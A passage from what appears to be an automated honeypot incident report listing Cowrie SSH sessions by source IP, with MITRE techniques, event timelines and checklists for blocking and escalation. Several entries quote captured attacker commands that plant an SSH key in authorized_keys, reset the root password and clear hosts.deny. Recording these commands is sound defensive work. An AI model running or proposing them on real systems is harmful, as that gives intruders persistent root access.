| `2026-04-12 11:03:21` | `cowrie.session.connect` |
| `2026-04-12 11:03:21` | `cowrie.client.version` |
| `2026-04-12 11:03:21` | `cowrie.client.kex` |
| `2026-04-12 11:03:21` | `cowrie.login.success` |
| `2026-04-12 11:03:21` | `cowrie.session.params` |
| `2026-04-12 11:03:21` | `cowrie.command.input` |
| `2026-04-12 11:03:21` | `cowrie.command.failed` |
| `2026-04-12 11:03:21` | `cowrie.log.closed` |
| `2026-04-12 11:03:22` | `cowrie.session.params` |
| `2026-04-12 11:03:22` | `cowrie.command.input` |
| `2026-04-12 11:03:22` | `cowrie.session.file_download` |
| `2026-04-12 11:03:22` | `cowrie.log.closed` |
| `2026-04-12 11:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa85431c9108

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 11:03 |
| **Last Seen** | 2026-04-12 11:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:03:23` | `cowrie.session.connect` |
| `2026-04-12 11:03:23` | `cowrie.client.version` |
| `2026-04-12 11:03:23` | `cowrie.client.kex` |
| `2026-04-12 11:03:24` | `cowrie.login.success` |
| `2026-04-12 11:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-514f9a531d4c

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 11:05 |
| **Last Seen** | 2026-04-12 11:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:05:23` | `cowrie.session.connect` |
| `2026-04-12 11:05:23` | `cowrie.client.version` |
| `2026-04-12 11:05:23` | `cowrie.client.kex` |
| `2026-04-12 11:05:23` | `cowrie.login.success` |
| `2026-04-12 11:05:23` | `cowrie.session.params` |
| `2026-04-12 11:05:23` | `cowrie.command.input` |
| `2026-04-12 11:05:23` | `cowrie.command.failed` |
| `2026-04-12 11:05:23` | `cowrie.log.closed` |
| `2026-04-12 11:05:24` | `cowrie.session.params` |
| `2026-04-12 11:05:24` | `cowrie.command.input` |
| `2026-04-12 11:05:24` | `cowrie.session.file_download` |
| `2026-04-12 11:05:24` | `cowrie.log.closed` |
| `2026-04-12 11:05:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a3a6a2d183e

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 11:05 |
| **Last Seen** | 2026-04-12 11:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:05:26` | `cowrie.session.connect` |
| `2026-04-12 11:05:26` | `cowrie.client.version` |
| `2026-04-12 11:05:26` | `cowrie.client.kex` |
| `2026-04-12 11:05:26` | `cowrie.login.success` |
| `2026-04-12 11:05:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d99e85e9d87

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 11:05 |
| **Last Seen** | 2026-04-12 11:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:05:28` | `cowrie.session.connect` |
| `2026-04-12 11:05:28` | `cowrie.client.version` |
| `2026-04-12 11:05:28` | `cowrie.client.kex` |
| `2026-04-12 11:05:29` | `cowrie.login.success` |
| `2026-04-12 11:05:30` | `cowrie.session.params` |
| `2026-04-12 11:05:30` | `cowrie.command.input` |
| `2026-04-12 11:05:30` | `cowrie.command.failed` |
| `2026-04-12 11:05:30` | `cowrie.log.closed` |
| `2026-04-12 11:05:31` | `cowrie.session.params` |
| `2026-04-12 11:05:31` | `cowrie.command.input` |
| `2026-04-12 11:05:31` | `cowrie.session.file_download` |
| `2026-04-12 11:05:31` | `cowrie.log.closed` |
| `2026-04-12 11:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2959b6cda49e

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 11:05 |
| **Last Seen** | 2026-04-12 11:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:05:35` | `cowrie.session.connect` |
| `2026-04-12 11:05:35` | `cowrie.client.version` |
| `2026-04-12 11:05:36` | `cowrie.client.kex` |
| `2026-04-12 11:05:37` | `cowrie.login.success` |
| `2026-04-12 11:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bbb1da5c2f1

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-04-12 11:20 |
| **Last Seen** | 2026-04-12 11:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:20:33` | `cowrie.session.connect` |
| `2026-04-12 11:20:33` | `cowrie.client.version` |
| `2026-04-12 11:20:33` | `cowrie.client.kex` |
| `2026-04-12 11:20:34` | `cowrie.login.success` |
| `2026-04-12 11:20:34` | `cowrie.session.params` |
| `2026-04-12 11:20:34` | `cowrie.command.input` |
| `2026-04-12 11:20:34` | `cowrie.command.failed` |
| `2026-04-12 11:20:35` | `cowrie.log.closed` |
| `2026-04-12 11:20:35` | `cowrie.session.params` |
| `2026-04-12 11:20:35` | `cowrie.command.input` |
| `2026-04-12 11:20:35` | `cowrie.session.file_download` |
| `2026-04-12 11:20:35` | `cowrie.log.closed` |
| `2026-04-12 11:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f13946780f8

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-04-12 11:20 |
| **Last Seen** | 2026-04-12 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:20:38` | `cowrie.session.connect` |
| `2026-04-12 11:20:38` | `cowrie.client.version` |
| `2026-04-12 11:20:38` | `cowrie.client.kex` |
| `2026-04-12 11:20:39` | `cowrie.login.success` |
| `2026-04-12 11:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e76f36459e22

| Field | Detail |
|---|---|
| **Source IP** | `115.239.224[.]92` |
| **First Seen** | 2026-04-12 11:21 |
| **Last Seen** | 2026-04-12 11:21 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:WPQRCvzJF5ey"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:21:28` | `cowrie.session.connect` |
| `2026-04-12 11:21:28` | `cowrie.client.version` |
| `2026-04-12 11:21:28` | `cowrie.client.kex` |
| `2026-04-12 11:21:29` | `cowrie.login.success` |
| `2026-04-12 11:21:29` | `cowrie.session.params` |
| `2026-04-12 11:21:29` | `cowrie.command.input` |
| `2026-04-12 11:21:29` | `cowrie.command.failed` |
| `2026-04-12 11:21:29` | `cowrie.log.closed` |
| `2026-04-12 11:21:29` | `cowrie.session.params` |
| `2026-04-12 11:21:29` | `cowrie.command.input` |
| `2026-04-12 11:21:30` | `cowrie.session.file_download` |
| `2026-04-12 11:21:30` | `cowrie.log.closed` |
| `2026-04-12 11:21:46` | `cowrie.session.params` |
| `2026-04-12 11:21:46` | `cowrie.command.input` |
| `2026-04-12 11:21:46` | `cowrie.log.closed` |
| `2026-04-12 11:21:46` | `cowrie.session.params` |
| `2026-04-12 11:21:46` | `cowrie.command.input` |
| `2026-04-12 11:21:46` | `cowrie.log.closed` |
| `2026-04-12 11:21:47` | `cowrie.session.params` |
| `2026-04-12 11:21:47` | `cowrie.command.input` |
| `2026-04-12 11:21:47` | `cowrie.session.file_download` |
| `2026-04-12 11:21:47` | `cowrie.log.closed` |
| `2026-04-12 11:21:47` | `cowrie.session.params` |
| `2026-04-12 11:21:47` | `cowrie.command.input` |
| `2026-04-12 11:21:47` | `cowrie.log.closed` |
| `2026-04-12 11:21:48` | `cowrie.session.params` |
| `2026-04-12 11:21:48` | `cowrie.command.input` |
| `2026-04-12 11:21:48` | `cowrie.log.closed` |
| `2026-04-12 11:21:48` | `cowrie.session.params` |
| `2026-04-12 11:21:48` | `cowrie.command.input` |
| `2026-04-12 11:21:48` | `cowrie.command.input` |
| `2026-04-12 11:21:48` | `cowrie.log.closed` |
| `2026-04-12 11:21:49` | `cowrie.session.params` |
| `2026-04-12 11:21:49` | `cowrie.command.input` |
| `2026-04-12 11:21:49` | `cowrie.log.closed` |
| `2026-04-12 11:21:49` | `cowrie.session.params` |
| `2026-04-12 11:21:49` | `cowrie.command.input` |
| `2026-04-12 11:21:49` | `cowrie.log.closed` |
| `2026-04-12 11:21:50` | `cowrie.session.params` |
| `2026-04-12 11:21:50` | `cowrie.command.input` |
| `2026-04-12 11:21:50` | `cowrie.log.closed` |
| `2026-04-12 11:21:50` | `cowrie.session.params` |
| `2026-04-12 11:21:50` | `cowrie.command.input` |
| `2026-04-12 11:21:50` | `cowrie.log.closed` |
| `2026-04-12 11:21:51` | `cowrie.session.params` |
| `2026-04-12 11:21:51` | `cowrie.command.input` |
| `2026-04-12 11:21:51` | `cowrie.log.closed` |
| `2026-04-12 11:21:51` | `cowrie.session.params` |
| `2026-04-12 11:21:51` | `cowrie.command.input` |
| `2026-04-12 11:21:51` | `cowrie.log.closed` |
| `2026-04-12 11:21:52` | `cowrie.session.params` |
| `2026-04-12 11:21:52` | `cowrie.command.input` |
| `2026-04-12 11:21:52` | `cowrie.log.closed` |
| `2026-04-12 11:21:52` | `cowrie.session.params` |
| `2026-04-12 11:21:52` | `cowrie.command.input` |
| `2026-04-12 11:21:52` | `cowrie.log.closed` |
| `2026-04-12 11:21:52` | `cowrie.session.params` |
| `2026-04-12 11:21:52` | `cowrie.command.input` |
| `2026-04-12 11:21:53` | `cowrie.log.closed` |
| `2026-04-12 11:21:53` | `cowrie.session.params` |
| `2026-04-12 11:21:53` | `cowrie.command.input` |
| `2026-04-12 11:21:53` | `cowrie.log.closed` |
| `2026-04-12 11:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.239.224[.]92` to AbuseIPDB if not already reported
- [ ] Block `115.239.224[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bc2468d5e71

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-12 11:21 |
| **Last Seen** | 2026-04-12 11:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:21:54` | `cowrie.session.connect` |
| `2026-04-12 11:21:54` | `cowrie.client.version` |
| `2026-04-12 11:21:54` | `cowrie.client.kex` |
| `2026-04-12 11:21:55` | `cowrie.login.success` |
| `2026-04-12 11:21:55` | `cowrie.session.params` |
| `2026-04-12 11:21:55` | `cowrie.command.input` |
| `2026-04-12 11:21:55` | `cowrie.command.failed` |
| `2026-04-12 11:21:56` | `cowrie.log.closed` |
| `2026-04-12 11:21:56` | `cowrie.session.params` |
| `2026-04-12 11:21:56` | `cowrie.command.input` |
| `2026-04-12 11:21:56` | `cowrie.session.file_download` |
| `2026-04-12 11:21:56` | `cowrie.log.closed` |
| `2026-04-12 11:22:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e55c01bdade9

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-12 11:21 |
| **Last Seen** | 2026-04-12 11:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:21:59` | `cowrie.session.connect` |
| `2026-04-12 11:21:59` | `cowrie.client.version` |
| `2026-04-12 11:21:59` | `cowrie.client.kex` |
| `2026-04-12 11:22:00` | `cowrie.login.success` |
| `2026-04-12 11:22:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fa8a6a8ebf9

| Field | Detail |
|---|---|
| **Source IP** | `14.103.50[.]32` |
| **First Seen** | 2026-04-12 11:24 |
| **Last Seen** | 2026-04-12 11:24 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0lETt5Z9n2t7"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:24:23` | `cowrie.session.connect` |
| `2026-04-12 11:24:23` | `cowrie.client.version` |
| `2026-04-12 11:24:23` | `cowrie.client.kex` |
| `2026-04-12 11:24:23` | `cowrie.login.success` |
| `2026-04-12 11:24:24` | `cowrie.session.params` |
| `2026-04-12 11:24:24` | `cowrie.command.input` |
| `2026-04-12 11:24:24` | `cowrie.command.failed` |
| `2026-04-12 11:24:24` | `cowrie.log.closed` |
| `2026-04-12 11:24:24` | `cowrie.session.params` |
| `2026-04-12 11:24:24` | `cowrie.command.input` |
| `2026-04-12 11:24:24` | `cowrie.session.file_download` |
| `2026-04-12 11:24:24` | `cowrie.log.closed` |
| `2026-04-12 11:24:40` | `cowrie.session.params` |
| `2026-04-12 11:24:40` | `cowrie.command.input` |
| `2026-04-12 11:24:41` | `cowrie.log.closed` |
| `2026-04-12 11:24:41` | `cowrie.session.params` |
| `2026-04-12 11:24:41` | `cowrie.command.input` |
| `2026-04-12 11:24:41` | `cowrie.log.closed` |
| `2026-04-12 11:24:41` | `cowrie.session.params` |
| `2026-04-12 11:24:41` | `cowrie.command.input` |
| `2026-04-12 11:24:41` | `cowrie.session.file_download` |
| `2026-04-12 11:24:41` | `cowrie.log.closed` |
| `2026-04-12 11:24:42` | `cowrie.session.params` |
| `2026-04-12 11:24:42` | `cowrie.command.input` |
| `2026-04-12 11:24:42` | `cowrie.log.closed` |
| `2026-04-12 11:24:42` | `cowrie.session.params` |
| `2026-04-12 11:24:42` | `cowrie.command.input` |
| `2026-04-12 11:24:42` | `cowrie.log.closed` |
| `2026-04-12 11:24:43` | `cowrie.session.params` |
| `2026-04-12 11:24:43` | `cowrie.command.input` |
| `2026-04-12 11:24:43` | `cowrie.command.input` |
| `2026-04-12 11:24:43` | `cowrie.log.closed` |
| `2026-04-12 11:24:43` | `cowrie.session.params` |
| `2026-04-12 11:24:43` | `cowrie.command.input` |
| `2026-04-12 11:24:43` | `cowrie.log.closed` |
| `2026-04-12 11:24:44` | `cowrie.session.params` |
| `2026-04-12 11:24:44` | `cowrie.command.input` |
| `2026-04-12 11:24:44` | `cowrie.log.closed` |
| `2026-04-12 11:24:44` | `cowrie.session.params` |
| `2026-04-12 11:24:44` | `cowrie.command.input` |
| `2026-04-12 11:24:44` | `cowrie.log.closed` |
| `2026-04-12 11:24:44` | `cowrie.session.params` |
| `2026-04-12 11:24:44` | `cowrie.command.input` |
| `2026-04-12 11:24:45` | `cowrie.log.closed` |
| `2026-04-12 11:24:45` | `cowrie.session.params` |
| `2026-04-12 11:24:45` | `cowrie.command.input` |
| `2026-04-12 11:24:45` | `cowrie.log.closed` |
| `2026-04-12 11:24:45` | `cowrie.session.params` |
| `2026-04-12 11:24:45` | `cowrie.command.input` |
| `2026-04-12 11:24:46` | `cowrie.log.closed` |
| `2026-04-12 11:24:46` | `cowrie.session.params` |
| `2026-04-12 11:24:46` | `cowrie.command.input` |
| `2026-04-12 11:24:46` | `cowrie.log.closed` |
| `2026-04-12 11:24:46` | `cowrie.session.params` |
| `2026-04-12 11:24:46` | `cowrie.command.input` |
| `2026-04-12 11:24:46` | `cowrie.log.closed` |
| `2026-04-12 11:24:47` | `cowrie.session.params` |
| `2026-04-12 11:24:47` | `cowrie.command.input` |
| `2026-04-12 11:24:47` | `cowrie.log.closed` |
| `2026-04-12 11:24:47` | `cowrie.session.params` |
| `2026-04-12 11:24:47` | `cowrie.command.input` |
| `2026-04-12 11:24:47` | `cowrie.log.closed` |
| `2026-04-12 11:24:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.50[.]32` to AbuseIPDB if not already reported
- [ ] Block `14.103.50[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daea25bd719a

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:09 |
| **Last Seen** | 2026-04-12 12:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:09:17` | `cowrie.session.connect` |
| `2026-04-12 12:09:17` | `cowrie.client.version` |
| `2026-04-12 12:09:17` | `cowrie.client.kex` |
| `2026-04-12 12:09:18` | `cowrie.login.success` |
| `2026-04-12 12:09:18` | `cowrie.session.params` |
| `2026-04-12 12:09:18` | `cowrie.command.input` |
